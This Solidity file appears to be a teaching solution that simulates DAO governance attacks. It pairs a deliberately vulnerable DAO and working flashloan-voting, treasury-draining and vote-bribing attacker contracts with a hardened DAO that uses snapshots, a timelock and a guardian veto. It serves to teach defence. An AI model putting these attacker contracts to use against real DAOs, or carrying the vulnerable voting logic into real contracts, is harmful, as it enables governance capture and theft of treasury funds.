// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title Project 39 Solution: Governance Attack Simulation
 * @notice Complete implementation of governance attacks and defenses
 * @dev Educational demonstration of DAO vulnerabilities and security patterns
 */

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/**
 * @title GovernanceTokenSolution
 * @notice ERC20 token with vote delegation and checkpointing
 * @dev Implements snapshot voting to prevent flashloan attacks
 */
contract GovernanceTokenSolution is ERC20 {
    // Delegation mappings
    mapping(address => address) public delegates;

    // Checkpoint tracking for historical voting power
    mapping(address => uint256) public numCheckpoints;
    mapping(address => mapping(uint256 => Checkpoint)) public checkpoints;

    struct Checkpoint {
        uint256 fromBlock;
        uint256 votes;
    }

    event DelegateChanged(address indexed delegator, address indexed fromDelegate, address indexed toDelegate);
    event DelegateVotesChanged(address indexed delegate, uint256 previousBalance, uint256 newBalance);

    constructor() ERC20("Governance Token", "GOV") {
        _mint(msg.sender, 1_000_000 * 1e18);
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    /**
     * @notice Delegate votes to another address
     * @param delegatee Address to delegate votes to
     */
    function delegate(address delegatee) external {
        address currentDelegate = delegates[msg.sender];
        uint256 delegatorBalance = balanceOf(msg.sender);

        delegates[msg.sender] = delegatee;

        emit DelegateChanged(msg.sender, currentDelegate, delegatee);

        _moveDelegates(currentDelegate, delegatee, delegatorBalance);
    }

    /**
     * @notice Get current voting power (includes delegated votes)
     * @param account Address to check
     * @return Current voting power
     */
    function getVotes(address account) external view returns (uint256) {
        uint256 nCheckpoints = numCheckpoints[account];
        return nCheckpoints > 0 ? checkpoints[account][nCheckpoints - 1].votes : 0;
    }

    /**
     * @notice Get voting power at a specific block (CRITICAL for security)
     * @param account Address to check
     * @param blockNumber Block number to check at
     * @return Voting power at that block
     * @dev This prevents flashloan attacks by using historical snapshots
     */
    function getPastVotes(address account, uint256 blockNumber) external view returns (uint256) {
        require(blockNumber < block.number, "Block not yet mined");

        uint256 nCheckpoints = numCheckpoints[account];
        if (nCheckpoints == 0) {
            return 0;
        }

        // Check most recent checkpoint
        if (checkpoints[account][nCheckpoints - 1].fromBlock <= blockNumber) {
            return checkpoints[account][nCheckpoints - 1].votes;
        }

        // Check earliest checkpoint
        if (checkpoints[account][0].fromBlock > blockNumber) {
            return 0;
        }

        // Binary search for the checkpoint
        uint256 lower = 0;
        uint256 upper = nCheckpoints - 1;
        while (upper > lower) {
            uint256 center = upper - (upper - lower) / 2;
            Checkpoint memory cp = checkpoints[account][center];
            if (cp.fromBlock == blockNumber) {
                return cp.votes;
            } else if (cp.fromBlock < blockNumber) {
                lower = center;
            } else {
                upper = center - 1;
            }
        }
        return checkpoints[account][lower].votes;
    }

    /**
     * @notice Override transfer to update delegated votes
     */
    function _update(address from, address to, uint256 amount) internal virtual override {
        super._update(from, to, amount);

        // Update delegate votes when tokens are transferred
        _moveDelegates(delegates[from], delegates[to], amount);
    }

    /**
     * @notice Move delegated votes between addresses
     * @param srcRep Previous delegate (or zero address)
     * @param dstRep New delegate (or zero address)
     * @param amount Number of votes to move
     */
    function _moveDelegates(address srcRep, address dstRep, uint256 amount) internal {
        if (srcRep != dstRep && amount > 0) {
            if (srcRep != address(0)) {
                uint256 srcRepNum = numCheckpoints[srcRep];
                uint256 srcRepOld = srcRepNum > 0 ? checkpoints[srcRep][srcRepNum - 1].votes : 0;
                uint256 srcRepNew = srcRepOld - amount;
                _writeCheckpoint(srcRep, srcRepNum, srcRepOld, srcRepNew);
            }

            if (dstRep != address(0)) {
                uint256 dstRepNum = numCheckpoints[dstRep];
                uint256 dstRepOld = dstRepNum > 0 ? checkpoints[dstRep][dstRepNum - 1].votes : 0;
                uint256 dstRepNew = dstRepOld + amount;
                _writeCheckpoint(dstRep, dstRepNum, dstRepOld, dstRepNew);
            }
        }
    }

    /**
     * @notice Write a new checkpoint or update the latest one
     */
    function _writeCheckpoint(address delegatee, uint256 nCheckpoints, uint256 oldVotes, uint256 newVotes) internal {
        if (nCheckpoints > 0 && checkpoints[delegatee][nCheckpoints - 1].fromBlock == block.number) {
            // Update existing checkpoint in same block
            checkpoints[delegatee][nCheckpoints - 1].votes = newVotes;
        } else {
            // Create new checkpoint
            checkpoints[delegatee][nCheckpoints] = Checkpoint(block.number, newVotes);
            numCheckpoints[delegatee] = nCheckpoints + 1;
        }

        emit DelegateVotesChanged(delegatee, oldVotes, newVotes);
    }
}

/**
 * @title VulnerableDAOSolution
 * @notice Intentionally vulnerable DAO for demonstrating attacks
 * @dev DO NOT USE IN PRODUCTION - Contains critical vulnerabilities
 */
contract VulnerableDAOSolution {
    GovernanceTokenSolution public governanceToken;

    struct Proposal {
        uint256 id;
        address proposer;
        string description;
        uint256 forVotes;
        uint256 againstVotes;
        uint256 startBlock;
        uint256 endBlock;
        bool executed;
        bool canceled;
        address target;
        bytes data;
        uint256 value;
    }

    mapping(uint256 => Proposal) public proposals;
    mapping(uint256 => mapping(address => bool)) public hasVoted;
    uint256 public proposalCount;

    uint256 public votingPeriod = 100;
    uint256 public votingDelay = 10;
    uint256 public proposalThreshold = 1000 * 1e18;
    uint256 public quorumVotes = 100_000 * 1e18;

    event ProposalCreated(uint256 indexed proposalId, address indexed proposer, string description);
    event VoteCast(address indexed voter, uint256 indexed proposalId, bool support, uint256 votes);
    event ProposalExecuted(uint256 indexed proposalId);

    constructor(address _governanceToken) {
        governanceToken = GovernanceTokenSolution(_governanceToken);
    }

    /**
     * @notice Create a new proposal
     * @dev VULNERABILITY: Uses current balance instead of snapshot
     */
    function propose(
        address target,
        uint256 value,
        bytes memory data,
        string memory description
    ) external returns (uint256) {
        // VULNERABILITY: Flashloan attack possible here
        require(
            governanceToken.balanceOf(msg.sender) >= proposalThreshold,
            "Below proposal threshold"
        );

        uint256 proposalId = proposalCount++;

        proposals[proposalId] = Proposal({
            id: proposalId,
            proposer: msg.sender,
            description: description,
            forVotes: 0,
            againstVotes: 0,
            startBlock: block.number + votingDelay,
            endBlock: block.number + votingDelay + votingPeriod,
            executed: false,
            canceled: false,
            target: target,
            data: data,
            value: value
        });

        emit ProposalCreated(proposalId, msg.sender, description);
        return proposalId;
    }

    /**
     * @notice Cast a vote on a proposal
     * @dev CRITICAL VULNERABILITY: Uses current balance for voting power!
     * This allows flashloan attacks - attacker can borrow tokens, vote, and return them
     */
    function castVote(uint256 proposalId, bool support) external {
        Proposal storage proposal = proposals[proposalId];
        require(block.number >= proposal.startBlock, "Voting not started");
        require(block.number <= proposal.endBlock, "Voting ended");
        require(!hasVoted[proposalId][msg.sender], "Already voted");

        // CRITICAL VULNERABILITY: Uses current balance!
        // Attacker can flashloan tokens, vote, return them in same transaction
        // The vote persists even after returning the tokens!
        uint256 votes = governanceToken.balanceOf(msg.sender);

        hasVoted[proposalId][msg.sender] = true;

        if (support) {
            proposal.forVotes += votes;
        } else {
            proposal.againstVotes += votes;
        }

        emit VoteCast(msg.sender, proposalId, support, votes);
    }

    /**
     * @notice Execute a passed proposal
     * @dev VULNERABILITY: No timelock - executes immediately
     */
    function execute(uint256 proposalId) external payable {
        Proposal storage proposal = proposals[proposalId];
        require(block.number > proposal.endBlock, "Voting not ended");
        require(!proposal.executed, "Already executed");
        require(!proposal.canceled, "Proposal canceled");
        require(proposal.forVotes > proposal.againstVotes, "Proposal failed");
        require(proposal.forVotes >= quorumVotes, "Quorum not reached");

        // VULNERABILITY: No timelock delay
        // Community cannot react to malicious proposals
        proposal.executed = true;

        (bool success, ) = proposal.target.call{value: proposal.value}(proposal.data);
        require(success, "Execution failed");

        emit ProposalExecuted(proposalId);
    }

    function hasReachedQuorum(uint256 proposalId) external view returns (bool) {
        Proposal storage proposal = proposals[proposalId];
        return (proposal.forVotes + proposal.againstVotes) >= quorumVotes;
    }

    function state(uint256 proposalId) external view returns (string memory) {
        Proposal storage proposal = proposals[proposalId];

        if (proposal.canceled) return "Canceled";
        if (proposal.executed) return "Executed";
        if (block.number <= proposal.startBlock) return "Pending";
        if (block.number <= proposal.endBlock) return "Active";
        if (proposal.forVotes <= proposal.againstVotes) return "Defeated";
        if (proposal.forVotes < quorumVotes) return "Quorum Not Reached";
        return "Succeeded";
    }

    receive() external payable {}
}

/**
 * @title SimpleFlashloanProviderSolution
 * @notice Provides flashloans for testing governance attacks
 */
contract SimpleFlashloanProviderSolution {
    GovernanceTokenSolution public token;

    event FlashloanExecuted(address indexed borrower, uint256 amount);

    constructor(address _token) {
        token = GovernanceTokenSolution(_token);
    }

    function depositTokens(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
    }

    /**
     * @notice Execute a flashloan
     * @param amount Amount to borrow
     * @param target Contract to call with borrowed tokens
     * @param data Calldata for the target
     */
    function flashloan(uint256 amount, address target, bytes calldata data) external {
        uint256 balanceBefore = token.balanceOf(address(this));
        require(balanceBefore >= amount, "Insufficient liquidity");

        // Transfer tokens to borrower
        token.transfer(msg.sender, amount);

        // Execute borrower's code (this is where the attack happens)
        (bool success, ) = target.call(data);
        require(success, "Flashloan callback failed");

        // Verify tokens were returned
        uint256 balanceAfter = token.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flashloan not repaid");

        emit FlashloanExecuted(msg.sender, amount);
    }
}

/**
 * @title FlashloanGovernanceAttackerSolution
 * @notice Complete implementation of flashloan governance attack
 * @dev Demonstrates how to exploit vulnerable DAO voting
 *
 * ATTACK FLOW:
 * 1. Attacker creates or identifies target proposal
 * 2. Attacker borrows massive amount of governance tokens via flashloan
 * 3. Attacker votes on proposal with borrowed tokens
 * 4. Attacker returns tokens to flashloan provider (all in one transaction)
 * 5. Vote is recorded and persists even though attacker no longer owns tokens
 * 6. Proposal passes and executes later, draining DAO treasury
 */
contract FlashloanGovernanceAttackerSolution {
    VulnerableDAOSolution public dao;
    SimpleFlashloanProviderSolution public flashloanProvider;
    GovernanceTokenSolution public token;

    uint256 public targetProposalId;
    bool public supportProposal;

    event AttackExecuted(uint256 proposalId, uint256 votesCast);

    constructor(address _dao, address _flashloanProvider, address _token) {
        dao = VulnerableDAOSolution(_dao);
        flashloanProvider = SimpleFlashloanProviderSolution(_flashloanProvider);
        token = GovernanceTokenSolution(_token);
    }

    /**
     * @notice Execute flashloan governance attack
     * @param proposalId ID of proposal to vote on
     * @param support Whether to vote for or against
     * @param amount Amount of tokens to flashloan
     *
     * ATTACK EXPLANATION:
     * - We borrow tokens via flashloan
     * - Vote with borrowed tokens
     * - Return tokens immediately
     * - Our vote remains counted even though we don't own tokens anymore!
     * - This works because VulnerableDAO uses balanceOf instead of snapshot
     */
    function attack(uint256 proposalId, bool support, uint256 amount) external {
        targetProposalId = proposalId;
        supportProposal = support;

        // Prepare callback data
        bytes memory data = abi.encodeWithSelector(
            this.onFlashloan.selector,
            amount
        );

        // Execute flashloan - this will:
        // 1. Transfer tokens to us
        // 2. Call onFlashloan (where we vote)
        // 3. Take tokens back
        flashloanProvider.flashloan(amount, address(this), data);

        emit AttackExecuted(proposalId, amount);
    }

    /**
     * @notice Flashloan callback - vote with borrowed tokens
     * @param amount Amount of tokens we borrowed
     *
     * CRITICAL INSIGHT:
     * At this moment, we own the tokens and can vote.
     * After this function returns, tokens go back to provider.
     * But our vote persists in the DAO's storage!
     */
    function onFlashloan(uint256 amount) external {
        require(msg.sender == address(this), "Only self can call");

        // Verify we received the tokens
        require(token.balanceOf(address(this)) >= amount, "Tokens not received");

        // Cast vote using borrowed tokens
        // The DAO will record our vote with amount = balanceOf(this)
        dao.castVote(targetProposalId, supportProposal);

        // Approve flashloan provider to take tokens back
        token.approve(address(flashloanProvider), amount);

        // After this function returns, flashloan provider reclaims tokens
        // But our vote remains in the DAO!
    }

    /**
     * @notice Create malicious proposal to drain treasury
     * @dev This shows how attacker could create and pass their own proposal
     */
    function createMaliciousProposal(
        address treasury,
        address payable attackerWallet,
        uint256 flashloanAmount
    ) external returns (uint256) {
        // First, we need tokens to create proposal (can also flashloan this)
        bytes memory data = abi.encodeWithSelector(
            this.onFlashloanCreate.selector,
            treasury,
            attackerWallet,
            flashloanAmount
        );

        flashloanProvider.flashloan(flashloanAmount, address(this), data);

        return targetProposalId;
    }

    function onFlashloanCreate(
        address treasury,
        address payable attackerWallet,
        uint256 /*amount*/
    ) external {
        // Create proposal to drain treasury
        bytes memory proposalData = abi.encodeWithSignature(
            "drainFunds(address)",
            attackerWallet
        );

        uint256 proposalId = dao.propose(
            treasury,
            0,
            proposalData,
            "Totally legitimate proposal"
        );

        targetProposalId = proposalId;

        // Approve tokens back for flashloan repayment
        token.approve(address(flashloanProvider), token.balanceOf(address(this)));
    }
}

/**
 * @title MaliciousTreasurySolution
 * @notice Example treasury that can be drained by malicious proposals
 */
contract MaliciousTreasurySolution {
    event TreasuryDrained(address indexed attacker, uint256 amount);
    event FundsReceived(address indexed sender, uint256 amount);

    receive() external payable {
        emit FundsReceived(msg.sender, msg.value);
    }

    /**
     * @notice Drain treasury funds
     * @dev This would be called by a malicious proposal
     */
    function drainFunds(address payable recipient) external {
        uint256 balance = address(this).balance;
        recipient.transfer(balance);
        emit TreasuryDrained(recipient, balance);
    }
}

/**
 * @title SafeDAOSolution
 * @notice Secure DAO implementation with defensive patterns
 * @dev Implements multiple security measures:
 * - Snapshot voting (prevents flashloan attacks)
 * - Timelock delay (gives community time to react)
 * - Guardian veto (last line of defense)
 * - Higher thresholds (makes attacks more expensive)
 */
contract SafeDAOSolution {
    GovernanceTokenSolution public governanceToken;

    struct Proposal {
        uint256 id;
        address proposer;
        string description;
        uint256 forVotes;
        uint256 againstVotes;
        uint256 snapshotBlock; // SECURITY: Snapshot voting power here
        uint256 startBlock;
        uint256 endBlock;
        uint256 eta; // SECURITY: Timelock - when proposal can execute
        bool executed;
        bool canceled;
        bool vetoed; // SECURITY: Guardian can veto
        address target;
        bytes data;
        uint256 value;
    }

    mapping(uint256 => Proposal) public proposals;
    mapping(uint256 => mapping(address => bool)) public hasVoted;
    uint256 public proposalCount;

    // SECURITY: More restrictive parameters
    uint256 public votingPeriod = 100;
    uint256 public votingDelay = 10;
    uint256 public proposalThreshold = 10_000 * 1e18; // 10x higher
    uint256 public quorumVotes = 200_000 * 1e18; // 2x higher
    uint256 public timelockPeriod = 172800; // 2 days (in seconds)
    uint256 public maxProposalValue = 100 ether; // Limit proposal value
    address public guardian; // Multisig that can veto

    event ProposalCreated(uint256 indexed proposalId, address indexed proposer, uint256 snapshotBlock);
    event VoteCast(address indexed voter, uint256 indexed proposalId, bool support, uint256 votes);
    event ProposalQueued(uint256 indexed proposalId, uint256 eta);
    event ProposalExecuted(uint256 indexed proposalId);
    event ProposalVetoed(uint256 indexed proposalId, address indexed guardian);

    constructor(address _governanceToken, address _guardian) {
        governanceToken = GovernanceTokenSolution(_governanceToken);
        guardian = _guardian;
    }

    /**
     * @notice Create a secure proposal with snapshot
     * @dev SECURITY: Takes snapshot of voting power at proposal creation
     */
    function propose(
        address target,
        uint256 value,
        bytes memory data,
        string memory description
    ) external returns (uint256) {
        // SECURITY: Use snapshot voting power, not current balance
        uint256 proposerVotes = governanceToken.getPastVotes(msg.sender, block.number - 1);
        require(proposerVotes >= proposalThreshold, "Below proposal threshold");

        // SECURITY: Limit proposal value
        require(value <= maxProposalValue, "Proposal value too high");

        uint256 proposalId = proposalCount++;
        uint256 snapshotBlock = block.number;

        proposals[proposalId] = Proposal({
            id: proposalId,
            proposer: msg.sender,
            description: description,
            forVotes: 0,
            againstVotes: 0,
            snapshotBlock: snapshotBlock, // SECURITY: Record snapshot
            startBlock: block.number + votingDelay,
            endBlock: block.number + votingDelay + votingPeriod,
            eta: 0, // Set when queued
            executed: false,
            canceled: false,
            vetoed: false,
            target: target,
            data: data,
            value: value
        });

        emit ProposalCreated(proposalId, msg.sender, snapshotBlock);
        return proposalId;
    }

    /**
     * @notice Cast vote using snapshot voting power
     * @dev SECURITY: Uses getPastVotes instead of balanceOf
     * This prevents flashloan attacks!
     */
    function castVote(uint256 proposalId, bool support) external {
        Proposal storage proposal = proposals[proposalId];
        require(block.number >= proposal.startBlock, "Voting not started");
        require(block.number <= proposal.endBlock, "Voting ended");
        require(!hasVoted[proposalId][msg.sender], "Already voted");
        require(!proposal.vetoed, "Proposal vetoed");

        // SECURITY: Use snapshot voting power from proposal creation time
        // This makes flashloan attacks impossible - attacker can't borrow
        // tokens and vote because their voting power is 0 at snapshot block
        uint256 votes = governanceToken.getPastVotes(msg.sender, proposal.snapshotBlock);

        require(votes > 0, "No voting power at snapshot");

        hasVoted[proposalId][msg.sender] = true;

        if (support) {
            proposal.forVotes += votes;
        } else {
            proposal.againstVotes += votes;
        }

        emit VoteCast(msg.sender, proposalId, support, votes);
    }

    /**
     * @notice Queue proposal for timelock
     * @dev SECURITY: Proposal must wait before execution
     */
    function queue(uint256 proposalId) external {
        Proposal storage proposal = proposals[proposalId];
        require(block.number > proposal.endBlock, "Voting not ended");
        require(!proposal.executed, "Already executed");
        require(!proposal.vetoed, "Proposal vetoed");
        require(proposal.forVotes > proposal.againstVotes, "Proposal failed");
        require(proposal.forVotes >= quorumVotes, "Quorum not reached");
        require(proposal.eta == 0, "Already queued");

        // SECURITY: Set execution time in future
        // This gives community time to react to malicious proposals
        proposal.eta = block.timestamp + timelockPeriod;

        emit ProposalQueued(proposalId, proposal.eta);
    }

    /**
     * @notice Execute proposal after timelock
     * @dev SECURITY: Requires timelock period to have passed
     */
    function execute(uint256 proposalId) external payable {
        Proposal storage proposal = proposals[proposalId];
        require(!proposal.executed, "Already executed");
        require(!proposal.vetoed, "Proposal vetoed");
        require(proposal.eta != 0, "Not queued");

        // SECURITY: Verify timelock has passed
        // Community has had time to review and potentially veto
        require(block.timestamp >= proposal.eta, "Timelock not expired");

        proposal.executed = true;

        (bool success, ) = proposal.target.call{value: proposal.value}(proposal.data);
        require(success, "Execution failed");

        emit ProposalExecuted(proposalId);
    }

    /**
     * @notice Guardian can veto malicious proposals
     * @dev SECURITY: Last line of defense against obvious attacks
     */
    function veto(uint256 proposalId) external {
        require(msg.sender == guardian, "Only guardian");

        Proposal storage proposal = proposals[proposalId];
        require(!proposal.executed, "Already executed");

        proposal.vetoed = true;

        emit ProposalVetoed(proposalId, msg.sender);
    }

    /**
     * @notice Get proposal state
     */
    function state(uint256 proposalId) external view returns (string memory) {
        Proposal storage proposal = proposals[proposalId];

        if (proposal.vetoed) return "Vetoed";
        if (proposal.canceled) return "Canceled";
        if (proposal.executed) return "Executed";
        if (block.number <= proposal.startBlock) return "Pending";
        if (block.number <= proposal.endBlock) return "Active";
        if (proposal.forVotes <= proposal.againstVotes) return "Defeated";
        if (proposal.forVotes < quorumVotes) return "Quorum Not Reached";
        if (proposal.eta == 0) return "Succeeded (Not Queued)";
        if (block.timestamp < proposal.eta) return "Queued";
        return "Ready to Execute";
    }

    receive() external payable {}
}

/**
 * @title VoteBuyingAttackerSolution
 * @notice Demonstrates vote buying through delegation
 * @dev Shows how attacker can accumulate voting power via delegation
 */
contract VoteBuyingAttackerSolution {
    GovernanceTokenSolution public token;
    VulnerableDAOSolution public dao;

    mapping(address => uint256) public bribes;

    event BribeOffered(address indexed voter, uint256 amount);
    event VoteBought(address indexed voter, uint256 votingPower);

    constructor(address _token, address _dao) {
        token = GovernanceTokenSolution(_token);
        dao = VulnerableDAOSolution(_dao);
    }

    /**
     * @notice Offer bribe to voters to delegate their votes
     * @dev In practice, this could be done via external coordination
     */
    function offerBribe(address voter, uint256 amount) external payable {
        require(msg.value >= amount, "Insufficient payment");
        bribes[voter] = amount;
        emit BribeOffered(voter, amount);
    }

    /**
     * @notice Voter accepts bribe and delegates votes
     * @dev This is called by the voter who wants to sell their votes
     */
    function acceptBribeAndDelegate() external {
        uint256 bribe = bribes[msg.sender];
        require(bribe > 0, "No bribe offered");

        // Delegate votes to attacker
        token.delegate(address(this));

        // Pay bribe
        bribes[msg.sender] = 0;
        payable(msg.sender).transfer(bribe);

        emit VoteBought(msg.sender, token.balanceOf(msg.sender));
    }

    /**
     * @notice Vote on proposal with accumulated delegated power
     */
    function voteWithBoughtPower(uint256 proposalId, bool support) external {
        dao.castVote(proposalId, support);
    }

    receive() external payable {}
}

/*
 * SOLUTION SUMMARY:
 *
 * VULNERABILITIES DEMONSTRATED:
 * 1. Flashloan Governance Attack - Borrow tokens, vote, return tokens
 * 2. Vote Buying - Accumulate delegated voting power
 * 3. No Timelock - Immediate execution of malicious proposals
 * 4. Current Balance Voting - Opens door to flashloan attacks
 *
 * SECURITY PATTERNS IMPLEMENTED:
 * 1. Snapshot Voting - Use getPastVotes to prevent flashloan attacks
 * 2. Timelock Delay - Give community 48 hours to react
 * 3. Guardian Veto - Multisig can veto obvious attacks
 * 4. Higher Thresholds - Make attacks more expensive
 * 5. Value Limits - Cap how much each proposal can transfer
 *
 * KEY INSIGHTS:
 * - Never use balanceOf for voting - always use snapshots
 * - Timelocks are critical for community safety
 * - Guardian/multisig is necessary evil for new DAOs
 * - Governance is a socio-technical problem, not just code
 * - No single solution is perfect - defense in depth required
 */
